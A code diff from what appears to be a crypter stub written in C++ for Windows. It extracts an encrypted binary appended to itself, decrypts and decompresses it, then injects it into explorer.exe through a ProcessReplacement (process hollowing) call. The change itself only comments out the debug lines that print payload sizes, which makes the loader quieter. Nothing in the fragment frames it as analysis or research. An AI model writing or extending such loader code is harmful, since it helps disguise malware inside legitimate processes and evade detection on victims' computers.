@@ -339,19 +339,19 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 	n_stub.erase(n_stub.end() - sizeof(size_t), n_stub.end());
 
 	size_t n_stSize = *reinterpret_cast<size_t*>(&n_vbSize.front());
-	std::cout << "[Stored] Size: " << n_stSize << std::endl;
-	std::cout << "[Stub+Bin] Size: " << n_stub.size() << std::endl;
+	//std::cout << "[Stored] Size: " << n_stSize << std::endl;
+	//std::cout << "[Stub+Bin] Size: " << n_stub.size() << std::endl;
 
 	std::vector<BYTE> n_bin(n_stub.end() - n_stSize, n_stub.end());
 	n_stub.erase(n_stub.end() - n_stSize, n_stub.end());
-	std::cout << "[Stub] Size: " << n_stub.size() << std::endl;
-	std::cout << "[Bin] Size: " << n_bin.size() << std::endl;
+	//std::cout << "[Stub] Size: " << n_stub.size() << std::endl;
+	//std::cout << "[Bin] Size: " << n_bin.size() << std::endl;
 
 	DecryptPE(n_bin);
-	std::cout << "[Decryption] Size: " << n_bin.size() << std::endl;
+	//std::cout << "[Decryption] Size: " << n_bin.size() << std::endl;
 
 	DecompressPE(n_bin);
-	std::cout << "[Decompression] Size: " << n_bin.size() << std::endl;
+	//std::cout << "[Decompression] Size: " << n_bin.size() << std::endl;
 
 	ProcessReplacement(A2T("C:\\Windows\\explorer.exe"), n_bin);
 
